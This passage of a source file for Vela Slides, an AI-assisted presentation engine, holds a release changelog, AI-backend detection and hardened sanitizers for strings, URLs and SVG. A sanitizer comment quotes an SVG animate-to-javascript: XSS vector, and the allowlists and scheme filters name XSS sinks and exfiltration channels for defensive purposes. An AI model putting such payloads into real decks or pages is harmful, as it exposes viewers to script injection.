// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
import { useState, useReducer, useEffect, useLayoutEffect, useRef, useCallback, useMemo } from "react";
import { ChevronLeft, ChevronRight, Maximize2, Minimize2, Plus, X, Presentation, Download, Upload, Search, FileDown } from "lucide-react";
import * as _LucideAll from "lucide-react";


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// VELA — Slide Engine powered by Vera AI
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//
// ⚠️  AI INSTRUCTION — READ BEFORE ANY EDIT:
//     On EVERY code change, you MUST:
//     1. Increment VELA_VERSION minor: "5.0" → "5.1" → "5.2" etc.
//     2. Add a VELA_CHANGELOG entry at the top of the array describing what changed.
//     3. Update SKILL.md version to match VELA_VERSION (both use major.minor format).
//     4. Never skip this. Never batch. Every edit = version bump.
//

const __DEBUG = false;
const dbg = __DEBUG ? console.log.bind(console) : () => {};
const VELA_LOCAL_MODE = false; // overridden to true by serve.py for local preview
const VELA_CHANNEL_PORT = 0; // overridden by serve.py with channel server port
const VELA_CHANNEL_TOKEN = ""; // overridden by serve.py; gates the AI channel's /action (local multi-user defense)
const VELA_PRESENTATION_MODE = false; // overridden to true for read-only viewer (agentia-learn)

// ━━━ AI Capability Detection ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Centralized flag: true when an AI backend is reachable (artifact proxy or channel).
// In local mode the channel port must be configured; in artifact mode we optimistically
// assume the Anthropic proxy is available (Claude.ai injects it).
const velaAIAvailable = () => {
  // Neutralino desktop runtime: the shell installs a CLI-backed sender;
  // AI availability follows whether that probe succeeded.
  if (typeof window !== "undefined" && window.__velaAgentReady != null) return !!window.__velaAgentReady;
  return VELA_LOCAL_MODE ? !!VELA_CHANNEL_PORT : (typeof window !== "undefined" && window.self !== window.top);
};
const VELA_AI_UNAVAILABLE_MSG = "AI features not enabled — no API channel detected";

// True only when running as a Claude.ai artifact (the Anthropic proxy that meters
// tokens). Desktop (Neutralino agent) and local serve.py bill nothing through the
// artifact proxy, so token/cost stats are meaningless there and are hidden. (CR)
const velaIsArtifactMode = () => {
  if (typeof window === "undefined") return false;
  if (window.__velaAgentReady != null || window.__velaAgentInfo != null) return false; // Neutralino desktop
  if (VELA_LOCAL_MODE) return false; // serve.py local preview
  return window.self !== window.top; // Claude.ai renders artifacts inside an iframe
};

// React hook: re-renders the caller when AI availability changes. velaAIAvailable()
// is a plain read of window.__velaAgentReady, which the Neutralino shell flips
// asynchronously once agent detection finishes and announces via a
// "vela-agent-update" event. Components that gate buttons on AI must subscribe,
// or they keep a stale disabled state until some unrelated re-render (e.g. the
// first Vera message) happens to refresh them. Artifact / serve.py runtimes never
// dispatch the event, so this simply returns the initial value there.
const useAIAvailable = () => {
  const [ok, setOk] = useState(velaAIAvailable);
  useEffect(() => {
    const sync = () => setOk(velaAIAvailable());
    sync(); // catch a flip between first render and effect mount
    window.addEventListener("vela-agent-update", sync);
    return () => window.removeEventListener("vela-agent-update", sync);
  }, []);
  return ok;
};

// Clipboard helper — Clipboard API is blocked in Claude.ai artifact iframes
// Uses execCommand('copy') fallback with a temporary textarea
const velaClipboard = (text) => {
  const fallback = () => {
    const ta = document.createElement("textarea");
    ta.value = text; ta.style.cssText = "position:fixed;left:-9999px;opacity:0";
    document.body.appendChild(ta); ta.select();
    try { document.execCommand("copy"); } catch {}
    document.body.removeChild(ta);
  };
  fallback();
};

// Copy a slide to the system clipboard as a Vela envelope (cross-tab transfer)
const velaClipboardWriteSlide = async (slide) => {
  const envelope = { _velaSlide: true, v: 1, data: JSON.parse(JSON.stringify(slide)) };
  const text = JSON.stringify(envelope);
  try {
    if (navigator.clipboard?.writeText) { await navigator.clipboard.writeText(text); return true; }
  } catch {}
  try { velaClipboard(text); return true; } catch { return false; }
};

// Read a Vela slide from the system clipboard (returns sanitized slide or null)
const velaClipboardReadSlide = async () => {
  try {
    const text = await navigator.clipboard.readText();
    if (!text) return null;
    const parsed = JSON.parse(text.trim());
    if (parsed?._velaSlide && parsed.data && typeof parsed.data === "object") {
      return sanitizeSlide(parsed.data);
    }
  } catch {}
  return null;
};

const VELA_VERSION = "12.85";
const VELA_CHANGELOG = [
  { v: "12.85", d: "PowerPoint export: fixed text rendering ~25% too small — font sizes now match the slide's 1:1 canvas-px→point scale, sized correctly relative to shapes and boxes. Added an image-measured font-scale calibration check." },
  { v: "12.84", d: ["Native PowerPoint (.pptx) export added to the Export menu — editable text boxes, shapes and tables (not flattened images).", "Vector diagrams (icons, flow, cycle) embed as native SVG with a PNG fallback for older PowerPoint; image-heavy slides use a raster hybrid.", "Gradient and per-color/alpha fidelity carried through; optional 'Made with Vela' caption.", "New Playwright + python-pptx e2e test drives the real export path and reads the deck back."] },
  { v: "12.83", d: "Fixed a path-resolution bug in the offline render harness that could silently build the wrong git tree's app when invoked from outside its own directory; added an explicit override." },
  { v: "12.82", d: ["New Deck dialog is now the single entry point — removed the separate 'From Source' dialog.", "Starting Prompt is optional and takes long pasted text (README / article / outline) directly; leaving it empty creates a fresh blank deck in a new file.", "Dropped in-dialog image attachments — instead, place files in the deck's folder and reference them by name in the prompt.", "An empty deck is now immediately editable: it opens with a fresh, ready-to-name section so you can add slides right away instead of a 'New Deck' prompt."] },
  { v: "12.81", d: ["Sprint 'Tradewinds' — share & present.", "Share: Export → Standalone HTML produces one shareable, read-only .html (no editor chrome), self-transpiled and safely inlined, loading React/lucide from a CDN with SHA-pinned integrity; optional 'Made with Vela ⛵' footer.", "Present: dedicated presenter/speaker view (current + next-slide preview, speaker notes, live elapsed timer, per-slide budget), grid gallery/overview reachable from the editor, and a tasteful deck-level slide transition.", "One-prompt: Generate Deck from Source turns a pasted README / URL text / PDF text into a full deck via the existing AI path.", "Present-mode polish: edit affordances fully suppressed while presenting, larger/higher-contrast slide counter, hover-consistent block add affordances, toolbar 'Edit' renamed 'AI Edit'.", "Test honesty: realigned UI-battery selectors, AI-dependent tests skip-with-reason when AI unavailable, jsdom-gated suites skip cleanly instead of failing."] },
  { v: "12.80", d: ["Local AI backend: `vela server` can drive Vera via the local `claude` CLI — no Anthropic API key.", "The agent runs as a locked-down text completion — no tools, MCP, filesystem, shell, or network.", "Shares one hardened security contract with the desktop gatekeeper, enforced by a parity test.", "AI is OFF by default; opt in with `vela server start --ai`. No change to artifact runtime."] },
  { v: "12.79", d: ["Security (defense-in-depth): hardened the plain-text field sanitizer.", "PDF-export links routed through the URL-scheme allowlist (http/https/mailto only).", "Regression coverage added."] },
  { v: "12.78", d: ["'+ add' menu (Blank / AI / Section) reveals on hover — in empty sections and between slides.", "Empty sections show a tall drop zone so a slide can be dropped in.", "Adding a Section between slides splits the tail into it and opens it focused for naming.", "Header stats pill always shows the slide count.", "Presenter: closing the TOC/search pane restores arrow-key navigation."] },
  { v: "12.77", d: "Changelog: condense historical release notes to concise one-line summaries." },
  { v: "12.76", d: "Sprint 7-1 UX batch: section drag-reorder (drops into empty sections too); Blank/AI/Section add menu (blank inherits prior styling); hide slides/elements via eye toggle (excluded from totals, exports, presenter TOC) with a visible-vs-hidden stats dialog; header rounds duration to whole minutes; presenter TOC/search on Ctrl+E; AI edits preserve existing images; Export Vela deck file; desktop new-deck writes a fresh file, About 'Check for updates', responsive Re-scan." },
  { v: "12.75", d: "Editing UX: searchable icon picker, per-item hover toolbar, inline '+ add', layout-aware image paste; side-by-side image layouts follow vertical align and size to the content column; link-over-zoom on zoomable blocks; live design-variant tiles with Original revert; Improve runs in background; serve.py script-tag boundary fix + test." },
  { v: "12.74", d: "Desktop AI action buttons (Improve, Alternatives, Vera) enable as soon as agent detection finishes, via a detection-event hook. Artifact/server runtimes unaffected." },
  { v: "12.73", d: "Desktop AI: Improve/Alternatives no longer hang when html2canvas can't load — loader fails safe to layout-stats-only. No change in artifact/server runtimes." },
  { v: "12.72", d: "Desktop AI: add GitHub Copilot CLI as a local-AI provider alongside Claude Code, via a hardened Node-free gatekeeper (webview still can't spawn processes; agents run with all tools disabled). Per-session confirmation and agent switching. Artifact/serve.py unchanged." },
  { v: "12.71", d: "Security (defense-in-depth): extend the inline-style value filter to non-color layout/sizing scalars; serve.py rejects empty Host and parses bracketed IPv6 Host literals. No behavior change; regression coverage added." },
  { v: "12.70", d: "Quality: remove three fail-soft/no-op patterns — timing failures now surface an error instead of overwriting durations, presenter nav UI tests assert the position changes, validate.py warns on un-expandable compact/turbo decks." },
  { v: "12.69", d: "Local/desktop: fix deck-switch data loss (cancel stale-deck timer, refuse empty writes, reset selection on change); LOCAL_MODE skips localStorage; presentation starts fullscreen." },
  { v: "12.68", d: "Security (defense-in-depth): close two residual CSS auto-load paths (slide background image, a block-level color field) and output-encode inline CSS url()/color values. Regression coverage added." },
  { v: "12.67", d: "Security: extend canonical slide/branding sanitization to in-app paths that mutate content after load. No behavior change; regression guards added." },
  { v: "12.66", d: "Security: close a residual CSS auto-load exfil channel; both value filters hardened to share one rule. Regression coverage added." },
  { v: "12.65", d: "Security (defense-in-depth): serve.py live-reload watcher re-validates folder containment on every re-read via the realpath guard. Regression test added." },
  { v: "12.64", d: "Security (defense-in-depth): consistent inline data: image sanitization (SVG routed through the SVG sanitizer, non-image data: dropped); strip control/bidi from prompt-guidelines; serve.py deck-name anti-spoofing. Regression coverage added." },
  { v: "12.63", d: "Security (defense-in-depth): serve.py now sends a Content-Security-Policy constraining image/connection egress to same-origin + inline data. No behavior change." },
  { v: "12.62", d: "Security: close a residual zero-click outbound-fetch channel in the SVG sanitizer (sanitized SVG re-parsed under HTML rules); output kept in SVG scope. jsdom regression battery + CI guard added." },
  { v: "12.61", d: "Security: close a CSS auto-load exfil channel on slide/block color scalars — now scrubbed at import; slide background-image clamped to inline data:image/*. jsdom + CI guards and in-browser cases added." },
  { v: "12.60", d: "Security (defense-in-depth): harden the SVG/CSS sanitizer so no deck content triggers an external request (URL refs constrained to same-document, images to data:). CI regression coverage added." },
  { v: "12.59", d: "serve.py: tighten the live-edit save endpoint — match the full request origin and require a JSON content type. Local-server hardening only." },
  { v: "12.58", d: "PDF export: fix dark boxes behind title-card badge/icon (gradient bg detection in the vector exporter); new 'Module title cards' export toggle with a live count. Default on." },
  { v: "12.57", d: "PDF export includes auto-generated module title cards to match presentation mode; buildTitleCardSlide() shared by presentation and PDF/markdown; card numbering excluded so real slides stay 1-based." },
  { v: "12.56", d: "Release bump to publish desktop binaries with the merged security hardening (assemble.py escape, SVG mutation-XSS, fail-closed deck loads, Neutralino containment). No engine change." },
  { v: "12.55", d: "Security (Critical): fix an output-encoding gap in assemble.py at the STARTUP_PATCH marker; centralized in a shared escape_for_script_context() helper. CI regression test added." },
  { v: "12.54", d: "Security (High): close a mutation-XSS hole in sanitizeSvgMarkup() and switch SVG element filtering to an allowlist. jsdom round-trip test added." },
  { v: "12.53", d: "Security (defense-in-depth): close a CSS-text exfil channel in SVG <style>; <link> removed and <style> limited to same-document references." },
  { v: "12.52", d: "Security: pin every GitHub Actions reference to a commit SHA (CI-guarded); bump @modelcontextprotocol/sdk to clear transitive advisories." },
  { v: "12.51", d: "Security (defense-in-depth): tighten SVG href validation to a scheme allowlist after DOMParser normalization; xlink:href stays fragment-only. Regression tests added." },
  { v: "12.50", d: "Security (Critical/High): LOAD_LANES reducer re-sanitizes every slide; new sanitizeStyle() + SAFE_STYLE_KEYS allowlist for style objects; ReAct loop caps per-turn/session tool counts and payload size." },
  { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage — CI source assertions + new in-browser uitest cases across the SVG and deck-sanitization paths." },
  { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in the SVG sanitizer (event handlers were already inert)." },
  { v: "12.47", d: "Security (High): fix a fail-open path in deck sanitization (oversized deck now clamped, fallbacks fail closed); route an extra chat-paste import path through full sanitization." },
  { v: "12.46", d: "Security (Medium): URL-sanitize all deck link fields at import and again at the click sink via a shared helper, including the study-notes glossary link." },
  { v: "12.45", d: "Security (High): sanitizeSvgMarkup() drops comment/CDATA/PI nodes during the DOM walk to prevent round-trip mutation XSS across all SVG sinks." },
  { v: "12.44", d: "Security (High): svg block markup now goes through DOM-based sanitizeSvgMarkup() at import and render, replacing a bypassable regex chain." },
  { v: "12.43", d: "Desktop release builds ship with the web inspector disabled by default; dev sessions re-enable DevTools via a runtime override, so no config churn." },
  { v: "12.42", d: "Single-file desktop binaries via `neu build --release --embed-resources` (resources.neu injected with postject); ZIPs contain just the binary. Requires neu ≥ 11.6 and Neutralino ≥ 6.3." },
  { v: "12.41", d: "Release pipeline: desktop binaries ship on every push to main; Neutralino runtime pinned by SHA256; shared workflow for stable + preview; SHA256SUMS + SLSA attestation per ZIP." },
  { v: "12.40", d: "Agent visibility + trust UX: footer agent chip (Vera · Claude Code · version · model · trust-state) opens a settings dialog with per-deck revoke and revoke-all. Feature-gated to desktop." },
  { v: "12.39", d: "Per-deck AI trust gate (desktop): callClaudeAPI awaits window.__velaTrustGate; shell stores trust per deck, denies are session-only, first use shows an intro. Artifact/serve.py fall through as allow." },
  { v: "12.38", d: "Agent-bridge hook: callClaudeAPI routes to window.__velaAgentSend when defined (desktop ships a Claude Code adapter spawning `claude -p`); velaAIAvailable consults window.__velaAgentReady. Artifact/serve.py unchanged." },
  { v: "12.37", d: "Header sail icon hook: top-bar VelaIcon calls window.__velaOpenDeckPicker when defined (desktop deck-folder picker), falling back to About/Changelog elsewhere." },
  { v: "12.36", d: "Centralized velaAIAvailable(); all AI buttons visible-but-disabled with a tooltip when AI is unavailable; fix vertical flow arrow alignment; remove demo slide 16." },
  { v: "12.35", d: "New layout:'cols' for two-column slides (L/R block arrays; contentFlex/imageFlex/splitGap; blocks full-width above). Full pipeline support (expand/compact/validate/stats/extract-text/patch-text)." },
  { v: "12.34", d: "Callout reveal: new 'reveal' (rv) makes callouts collapsible with a chevron indicator." },
  { v: "12.33", d: "Code block copy button: new 'copy' (cp) adds a Copiar button with copied feedback." },
  { v: "12.32", d: "Offline studyNotes: embedded markdown, inline SVG diagram, follow-up questions, and X-Ray glossary popups — renders with zero API calls; new 🎓 marker; size/SVG/URL limits enforced." },
  { v: "12.31", d: "Fix fullscreen button collision — shift the cinema tip so all top-right buttons are visible." },
  { v: "12.30", d: "Comparison block: center content within each pane for equal spacing to the VS divider." },
  { v: "12.29", d: "Fix matrix block vertical axis labels via flex-based centering." },
  { v: "12.28", d: "Fix cycle block arrow geometry using direct node-to-node vectors." },
  { v: "12.27", d: "SKILL.md additive update: v12.2 verbatim + 6 new block examples and compact keys. Eval-validated." },
  { v: "12.25", d: "6 new block primitives: comparison, funnel, cycle, number-row, matrix, checklist. Compact/turbo support. Block count 21 → 27." },
  { v: "12.24", d: "Arrow Up/Down slide nav; server graceful lifecycle; .vela extension + deck rename; supply-chain security improvements." },
  { v: "12.23", d: "Fix PDF export: branding logo renders in canvas + vector; watermark respects showBranding; vector modal branding toggle." },
  { v: "12.22", d: "Flow and badge blocks: icons, arrows, padding now scale with size/labelSize." },
  { v: "12.21", d: "Add explicit UTF-8 encoding to all file open() calls (Windows compatibility)." },
  { v: "12.20", d: "Browser tab title syncs with the deck title." },
  { v: "12.19", d: "Security: block data: and vbscript: URI schemes in SVG href/xlink:href and style url()." },
  { v: "12.18", d: "Security: SVG sanitizer rewritten with DOMParser (DOM-based tag/attribute removal instead of regex)." },
  { v: "12.16", d: "Fix: student mode routes through the channel in local mode (was hitting the keyless direct API)." },
  { v: "12.15", d: "Security: sanitize SVG in the chat panel; block javascript: URIs in links and image src." },
  { v: "12.14", d: "Fix footer/counter contrast on light slides via slide-brightness auto-detect." },
  { v: "12.13", d: "Fix: table header text defaults to white when headerBg is set; global counter uses displayIndex/displayTotal." },
  { v: "12.12", d: "Fix section drag-and-drop; global slide/total counter; auto-focus Vera chat input." },
  { v: "12.10", d: "Fix folder/local deck loading — STARTUP_PATCH (file on disk) is authoritative over localStorage." },
  { v: "12.9", d: "Comments UX: slide-count badge always visible; module comment count + 💬 toggle in review mode." },
  { v: "12.8", d: "Review Mode: inline comment cards next to referenced blocks with resolve/delete per row." },
  { v: "12.7", d: "Review Mode: inline comments system — panel, badges, anchor quoting, batch resolve; Vera comment tools." },
  { v: "12.6", d: "Gallery: shimmer loading animation on thumbnails." },
  { v: "12.5", d: "Security: symlink escape checks on save/upload endpoints; replace cmd.exe launch with webbrowser.open()." },
  { v: "12.4", d: "Rename vela-template.jsx → vela.jsx; consolidate demo deck under skills/; add themed example decks." },
  { v: "12.3", d: "Security hardening: DNS-rebind protection, path-traversal + symlink checks, safe Content-Length, security headers, XSS-safe deck name." },
  { v: "12.1", d: "Channel mode: 120s timeout; SSE late-reply recovery for chat tool_calls." },
  { v: "12.0", d: "UI polish: larger chrome fonts, resizable persisted TOC, gallery delete/zoom persistence, cumulative TOC time, strikethrough." },
  { v: "11.9", d: "Channel server: kill stale port processes on startup; handle EADDRINUSE." },
  { v: "11.7", d: "Channel complete action: route Vera completion through Claude Code (no API key)." },
  { v: "10.6", d: "Editor TOC auto-scrolls to the active slide on arrow-key nav." },
  { v: "10.5", d: "Hot reload — browser auto-refreshes on concat.py rebuild." },
  { v: "10.4", d: "Fix Ctrl+C copying the wrong slide (stale-closure ref fix)." },
  { v: "10.3", d: "Browser Fullscreen API in local mode; cross-tab slide clipboard; TOC auto-scroll fix." },
  { v: "10.2", d: "Gallery drag-and-drop reorder; extra zoom levels; hardened undo/redo clamping; size 983→947KB." },
  { v: "10.1", d: "Gallery redesign — continuous CSS grid; theme-aware Gallery/Presenter TOC; undo/redo crash fix; demo end-card prompts; size 983→859KB." },
  { v: "10.0", d: "Student Mode (🎓) teaching assistant in presenter mode (Haiku 4.5 + caching); Gallery View (🗂) slide sorter (press G)." },
  { v: "9.30", d: "Auto-select first slide on every deck load; progress block flat format; Babel JSX validation on minified output." },
  { v: "9.29", d: "Smart deck merge with per-item conflict resolution; Babel JSX validation in the assembly pipeline." },
  { v: "9.28", d: "Vector PDF export — scalable text with embedded zlib-compressed fonts." },
  { v: "9.1", d: "Session cost tracker (💲); cinematic 🎬 demo mode." },
  { v: "9.0", d: "Agentic editing & mobile-first: edit_slide tool, ReAct loop, layout stats, variants (🎲), UI test suite, ELv2 licensing." },
  { v: "8.0", d: "First public release: 3-zone layout, Vera AI chat (18 tools), batch edit, branding, PDF/Markdown export, drag & drop, presenter mode, persistent storage." },
];

// ━━━ Session Cost Tracker ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Sonnet 4 pricing (USD per million tokens) — as of 2025-05
const VELA_PRICING = { input: 3, output: 15, cacheRead: 0.30, cacheCreate: 3.75 };
const velaSessionStats = {
  calls: [],
  add(entry) { this.calls.push({ ...entry, ts: Date.now() }); this._notify(); },
  _listeners: [],
  onChange(fn) { this._listeners.push(fn); return () => { this._listeners = this._listeners.filter((f) => f !== fn); }; },
  _notify() { for (const fn of this._listeners) fn(); },
  get totalCalls() { return this.calls.length; },
  get totalInputTokens() { return this.calls.reduce((s, c) => s + (c.input_tokens || 0), 0); },
  get totalOutputTokens() { return this.calls.reduce((s, c) => s + (c.output_tokens || 0), 0); },
  get totalCacheReadTokens() { return this.calls.reduce((s, c) => s + (c.cache_read_tokens || 0), 0); },
  get totalCacheCreateTokens() { return this.calls.reduce((s, c) => s + (c.cache_create_tokens || 0), 0); },
  get totalCost() {
    const m = 1_000_000;
    return (this.totalInputTokens * VELA_PRICING.input / m)
      + (this.totalOutputTokens * VELA_PRICING.output / m)
      + (this.totalCacheReadTokens * VELA_PRICING.cacheRead / m)
      + (this.totalCacheCreateTokens * VELA_PRICING.cacheCreate / m);
  },
  get byType() {
    const map = {};
    for (const c of this.calls) {
      const t = c.type || "unknown";
      if (!map[t]) map[t] = { calls: 0, input: 0, output: 0, cost: 0 };
      map[t].calls++;
      map[t].input += (c.input_tokens || 0);
      map[t].output += (c.output_tokens || 0);
      const m = 1_000_000;
      map[t].cost += ((c.input_tokens || 0) * VELA_PRICING.input / m) + ((c.output_tokens || 0) * VELA_PRICING.output / m)
        + ((c.cache_read_tokens || 0) * VELA_PRICING.cacheRead / m) + ((c.cache_create_tokens || 0) * VELA_PRICING.cacheCreate / m);
    }
    return map;
  },
  reset() { this.calls = []; this._notify(); },
};

const MASTER_KEY = "vela-deck";
const MOD_PREFIX = "vela-m-";
const uid = () => crypto.randomUUID ? crypto.randomUUID().slice(0, 8) : Math.random().toString(36).slice(2, 10);

// ━━━ Startup Patch System ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Set STARTUP_PATCH to apply changes on load:
//   Full deck:  { lanes: [...], deckTitle: "..." }     → replaces entire deck
//   Slide list: { slides: [ {slide}, {slide}, ... ] }  → Levenshtein match & replace
//   null/undefined → no-op
const STARTUP_PATCH = null;

// Levenshtein distance (Wagner-Fischer)
function levenshtein(a, b) {
  if (a === b) return 0;
  if (!a.length) return b.length;
  if (!b.length) return a.length;
  const m = a.length, n = b.length;
  let prev = Array.from({ length: n + 1 }, (_, i) => i);
  let curr = new Array(n + 1);
  for (let i = 1; i <= m; i++) {
    curr[0] = i;
    for (let j = 1; j <= n; j++) {
      curr[j] = a[i - 1] === b[j - 1] ? prev[j - 1] : 1 + Math.min(prev[j - 1], prev[j], curr[j - 1]);
    }
    [prev, curr] = [curr, prev];
  }
  return prev[n];
}

// Extract all text content from a slide for fuzzy matching
function extractSlideText(slide) {
  if (!slide) return "";
  const parts = [slide.title || ""];
  const walkBlocks = (blocks) => {
    if (!Array.isArray(blocks)) return;
    for (const b of blocks) {
      if (b.text) parts.push(b.text);
      if (b.title) parts.push(b.title);
      if (b.label) parts.push(b.label);
      if (b.items) {
        for (const item of b.items) {
          if (typeof item === "string") parts.push(item);
          else if (item) {
            if (item.text) parts.push(item.text);
            if (item.title) parts.push(item.title);
            if (item.label) parts.push(item.label);
            if (item.blocks) walkBlocks(item.blocks);
          }
        }
      }
    }
  };
  walkBlocks(slide.blocks);
  return parts.join(" ").toLowerCase().trim();
}

// Apply startup patch to loaded deck data
function applyStartupPatch(loadedDeck, dispatch) {
  if (!STARTUP_PATCH) return;
  dbg("[PATCH] Applying startup patch...");

  // Full deck replace
  if (STARTUP_PATCH.lanes) {
    dbg("[PATCH] Full deck replace");
    try {
      const sanitized = validateAndSanitizeDeck(STARTUP_PATCH);
      dispatch({ type: "LOAD", payload: { ...sanitized, deckTitle: STARTUP_PATCH.deckTitle || "Untitled" } });
    } catch (e) {
      // Fail closed: never load an unsanitized deck. validateAndSanitizeDeck only throws
      // on fundamentally invalid input (not an object / no lanes array) now that the
      // lane-count limit is clamped rather than thrown.
      dbg("[PATCH] Sanitize failed, skipping patch (not loading raw):", e);
    }
    return;
  }

  // Slide-level patching via Levenshtein
  if (STARTUP_PATCH.slides && Array.isArray(STARTUP_PATCH.slides)) {
    const patchSlides = STARTUP_PATCH.slides;
    // Build index of all existing slides with their text fingerprint
    const index = [];
    for (const lane of (loadedDeck.lanes || [])) {
      for (const item of (lane.items || [])) {
        for (let si = 0; si < (item.slides || []).length; si++) {
          index.push({ itemId: item.id, slideIdx: si, text: extractSlideText(item.slides[si]), slide: item.slides[si] });
        }
      }
    }

    let matched = 0;
    for (const pSlide of patchSlides) {
      const pText = extractSlideText(pSlide);
      if (!pText) continue;

      // Find best match by normalized Levenshtein
      let bestScore = Infinity, bestEntry = null;
      for (const entry of index) {
        const dist = levenshtein(pText, entry.text);
        const maxLen = Math.max(pText.length, entry.text.length) || 1;
        const normalized = dist / maxLen;
        if (normalized < bestScore) { bestScore = normalized; bestEntry = entry; }
      }

      // Threshold: accept if < 0.6 normalized distance (allows significant edits)
      if (bestEntry && bestScore < 0.6) {
        dbg(`[PATCH] Matched "${pSlide.title || "?"}" → "${bestEntry.slide.title || "?"}" (score: ${bestScore.toFixed(3)})`);
        dispatch({ type: "UPDATE_SLIDE", id: bestEntry.itemId, index: bestEntry.slideIdx, patch: pSlide });
        matched++;
      } else {
        dbg(`[PATCH] No match for "${pSlide.title || "?"}" (best: ${bestScore.toFixed(3)})`);
      }
    }
    dbg(`[PATCH] Done: ${matched}/${patchSlides.length} slides matched and patched`);
  }
}

// ━━━ Distributed Storage: dirty tracking ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const _dirtyMods = new Set();
const _deletedMods = new Set();
const _loadedMods = new Set(); // Track modules that loaded successfully (vs read failures)
let _autoEditItemId = null; // id of a just-inserted section that should open in title-edit mode
let _fullRewrite = false;
const now = () => new Date().toISOString();

// ━━━ Validation Constants ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const MAX_IMPORT_SIZE = 10 * 1024 * 1024;
const VALID_STATUSES = new Set(["todo", "done", "signed-off"]);
const VALID_IMPORTANCES = new Set(["must", "should", "nice"]);
const SAFE_BLOCK_TYPES = new Set(["heading", "text", "bullets", "image", "code", "grid", "callout", "metric", "quote", "divider", "spacer", "badge", "icon", "icon-row", "flow", "table", "progress", "steps", "tag-group", "timeline", "svg", "comparison", "funnel", "cycle", "number-row", "matrix", "checklist"]);

const defaultBranding = {
  enabled: false,
  accentBar: true, accentColor: "#3B82F6", accentHeight: 4,
  logo: null, logoPosition: "top-left", logoSize: 56,
  footerLeft: "", footerCenter: "", footerRight: "auto",
  footerBg: "rgba(0,0,0,0.35)", footerColor: "#94a3b8", footerSize: 9,
  imgMaxWidth: 600, imgQuality: 0.45,
};

// Friendly link preview for title attributes
function linkPreview(url, label) {
  if (label) return `${label}\n${url}`;
  try {
    const u = new URL(url);
    const domain = u.hostname.replace(/^www\./, "");
    const path = u.pathname === "/" ? "" : u.pathname.replace(/\/$/, "").split("/").slice(-2).join("/");
    return path ? `${domain}/${path}` : domain;
  } catch(_) { return url; }
}

// ━━━ Sanitizers ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function sanitizeString(val, maxLen = 500) {
  if (typeof val !== "string") return "";
  // Defense-in-depth: strip NULL bytes (sentinel safety for parseInline link
  // extraction), then strip HTML tags. A single pass of /<[^>]*>/ is incomplete:
  // it needs a closing '>', so an unclosed or regex-reconstructed '<script...'
  // could survive. We repeat the tag strip to a fixpoint, then drop any residual
  // tag-opening '<' (one followed by a letter, '!' or '/'). A bare '<' used as
  // math (e.g. 'a < b') is preserved. Truncate last.
  let out = val.replace(/\u0000/g, "");
  let prev;
  do { prev = out; out = out.replace(/<[^>]*>/g, ""); } while (out !== prev);
  return out.replace(/<(?=[a-zA-Z!/])/g, "").slice(0, maxLen);
}

function sanitizeUrl(url, allowedProtocols = ["http:", "https:", "mailto:"]) {
  if (typeof url !== "string") return "";
  const trimmed = url.trim();
  if (!trimmed) return "";
  try {
    const parsed = new URL(trimmed, "https://placeholder.invalid");
    if (allowedProtocols.includes(parsed.protocol)) return trimmed;
    return "";
  } catch (_) { return ""; }
}

// Open a deck-supplied URL safely — re-sanitize at the sink so a javascript:/data:/
// vbscript: link can never reach window.open even if a mutation path skipped import
// sanitization or a future runtime (e.g. desktop webview) allows those schemes.
function openExternalLink(url) {
  const safe = sanitizeUrl(url);
  if (safe) window.open(safe, "_blank", "noopener,noreferrer");
}

// SECURITY (v12.54): allowlist, not blocklist. Mirrors DOMPurify's SVG profile
// (src/tags.ts `svg` + `svgFilters`) with Vela-specific exclusions for our
// threat model (static presentation diagrams, no animation, no cross-doc
// references). Anything not in this set — including the entire HTML rawtext
// family (xmp/noembed/noscript/noframes/plaintext/listing) and any future
// surprise tag — is removed during the walk. Excluded by design (commented
// alongside each group): script/iframe/embed/object/link (XSS sinks),
// foreignObject (re-enters HTML namespace, full HTML XSS surface), use (cross-
// doc reference XSS — Cure53 #283 class), animate/animateColor/animateMotion/
// animateTransform/set/mpath/discard/cursor (SMIL attr-mutation: `<animate
// attributeName=href values=javascript:...>`), handler/listener (legacy
// scripting hooks), font-face (FOUC + URL loaders).
const SVG_ALLOWED_TAGS = new Set([
  // structural
  "svg", "g", "defs", "symbol", "switch", "view", "desc", "title", "metadata",
  "marker", "mask", "clippath", "pattern", "filter",
  // shapes
  "circle", "ellipse", "line", "path", "polygon", "polyline", "rect",
  // text/font (font/glyph/hkern/vkern + tref are deprecated but legitimate; no XSS surface)
  "text", "tspan", "textpath", "tref", "altglyph", "altglyphdef", "altglyphitem",
  "glyph", "glyphref", "font", "hkern", "vkern",
  // gradients / paints
  "lineargradient", "radialgradient", "stop",
  // filter primitives (the `fe*` family — purely declarative pixel ops)
  "feblend", "fecolormatrix", "fecomponenttransfer", "fecomposite",
  "feconvolvematrix", "fediffuselighting", "fedisplacementmap", "fedistantlight",
  "fedropshadow", "feflood", "fefunca", "fefuncb", "fefuncg", "fefuncr",
  "fegaussianblur", "feimage", "femerge", "femergenode", "femorphology",
  "feoffset", "fepointlight", "fespecularlighting", "fespotlight", "fetile",
  "feturbulence",
  // common-but-needs-care (each has explicit attribute filtering downstream)
  "a",      // href passes scheme allowlist
  "image",  // href/xlink:href pass scheme allowlist
  "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
]);

// SVG attributes whose value can carry a functional URL reference that the
// browser fetches automatically on render (zero-click). style="…" holds CSS;
// the rest are paint/filter/mask/marker/clip-path/cursor presentation
// attributes that accept url(…) / image-set(…) / etc. Each value is run through
// isSvgStyleSafe() so only same-document url(#fragment) survives — no external
// url(), no image-set()/image()/cross-fade()/src() string sources. (v12.59)
const SVG_URL_REF_ATTRS = new Set([
  "style", "fill", "stroke", "filter", "mask", "clip-path",
  "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
